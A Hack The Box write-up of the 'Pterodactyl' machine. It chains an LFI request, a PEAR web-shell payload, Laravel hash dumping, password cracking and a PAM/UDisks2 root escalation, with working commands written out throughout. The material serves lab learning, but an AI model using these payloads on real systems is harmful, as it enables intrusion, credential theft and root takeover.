Pterodactyl – Full Write-Up

Platform: Hack The Box
Difficulty: Medium
OS: Linux (openSUSE Leap 15.6)

⸻

1️⃣ Reconnaissance

Nmap Scan

nmap -sC -sV -p- panel.pterodactyl.htb

Open ports discovered:
    •   22/tcp – SSH
    •   80/tcp – HTTP

The web service hosted a Pterodactyl panel instance.

⸻

2️⃣ Web Enumeration

Browsing the application revealed a Laravel-based backend.

Directory and endpoint testing identified:

/locales/locale.json

This endpoint accepted two parameters:
    •   locale
    •   namespace

⸻

3️⃣ Local File Inclusion (LFI)

Testing for traversal:

curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../etc/passwd"

The response confirmed arbitrary file read via path traversal.

This meant the locale parameter was unsanitized.

⸻

4️⃣ PEAR Abuse → Remote Code Execution

Since this was a PHP/Laravel application, attention shifted to:

/usr/local/lib/php/pearcmd

Using the LFI vector, PEAR’s config-create functionality was abused to write a malicious PHP file.

Writing Web Shell

curl -g "http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../../usr/local/lib/php/pearcmd&namespace=pearcmd&/<?=system(hex2bin('77686f616d69'))?>+/tmp/shell.php"

This wrote a PHP file to /tmp/shell.php.

Shell execution confirmed command execution.

Reverse shell was obtained as:

wwwrun

Initial foothold achieved.

⸻

5️⃣ Database Enumeration

Inside the web root:

/var/www/pterodactyl

The .env file revealed database credentials:

DB_DATABASE=panel
DB_USERNAME=pterodactyl
DB_PASSWORD=PteraPanel

Direct MySQL login failed (likely local-only restrictions).

Instead, Laravel’s built-in Artisan console was used.

⸻

6️⃣ Dumping User Credentials via Artisan

php artisan tinker

Inside Tinker:

DB::select('select id,username,password from users');

Two users retrieved:
    •   headmonitor
    •   phileasfogg3

Both had bcrypt password hashes.

⸻

7️⃣ Password Cracking

On attacker machine:

hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

Recovered:

phileasfogg3 : !QAZ2wsx


⸻

8️⃣ SSH Access

ssh phileasfogg3@panel.pterodactyl.htb

Login successful.

User flag obtained:

cat /home/phileasfogg3/user.txt


⸻

9️⃣ Privilege Escalation

System information:

cat /etc/os-release
uname -a

Key components:
    •   openSUSE Leap 15.6
    •   pam-1.3.0
    •   udisks2-2.9.2
    •   libblockdev-2.26

These versions were vulnerable to a chained privilege escalation:
    •   CVE-2025-6018
    •   CVE-2025-6019

⸻

🔟 Privilege Escalation – Exploit Chain

⸻

STAGE 1 – Create Malicious XFS Image (Attacker)

On x86_64 system:

sudo ./ExploitChain.sh stage1 xfs.image

This:
    •   Created 300MB XFS filesystem
    •   Inserted SUID root bash
    •   Prepared image for exploitation

Transfer to target:

scp xfs.image phileasfogg3@<target_ip>:/tmp/


⸻

STAGE 2 – PAM Injection (CVE-2025-6018)

On target:

./ExploitChain.sh stage2

This created:

~/.pam_environment

With:

XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
XDG_SESSION_TYPE OVERRIDE=x11
XDG_SESSION_CLASS OVERRIDE=user

Logout and reconnect:

logout
ssh phileasfogg3@<target_ip>

Verify:

loginctl show-session <id>

Now shows:

Seat=seat0
Active=yes

The SSH session is treated as a local active session.

This grants allow_active privileges via PolicyKit.

⸻

STAGE 3 – UDisks2 Resize Exploit (CVE-2025-6019)

Trigger:

./ExploitChain.sh stage3 /tmp/xfs.image

Exploit flow:
    1.  Image mapped to /dev/loopX
    2.  D-Bus call triggers Filesystem.Resize
    3.  libblockdev auto-mounts filesystem
    4.  Resize intentionally fails
    5.  Mount is not cleaned up

A directory appears:

/tmp/blockdev.XXXXXX

Inside:

-rwsr-xr-x root root bash


⸻

Root Access

/tmp/blockdev.XXXXXX/bash -p
id

Output:

uid=0(root)

Root obtained.

System flag:

cat /root/root.txt


⸻

Attack Chain Summary
    1.  Path traversal via locale.json
    2.  PEAR abuse to write PHP shell
    3.  Reverse shell as wwwrun
    4.  Dump bcrypt hashes via Laravel Artisan
    5.  Crack password for phileasfogg3
    6.  SSH login
    7.  PAM environment injection
    8.  UDisks2 resize race
    9.  SUID bash execution → root

⸻

Key Takeaways
    •   LFI combined with PEAR can escalate to RCE.
    •   Laravel Artisan can bypass DB authentication restrictions.
    •   Bcrypt cracking requires optimized strategy.
    •   Architecture matters when crafting filesystem payloads.
    •   PAM environment poisoning can alter PolicyKit session classification.
    •   UDisks2/libblockdev resize race allows SUID mount abuse.

⸻
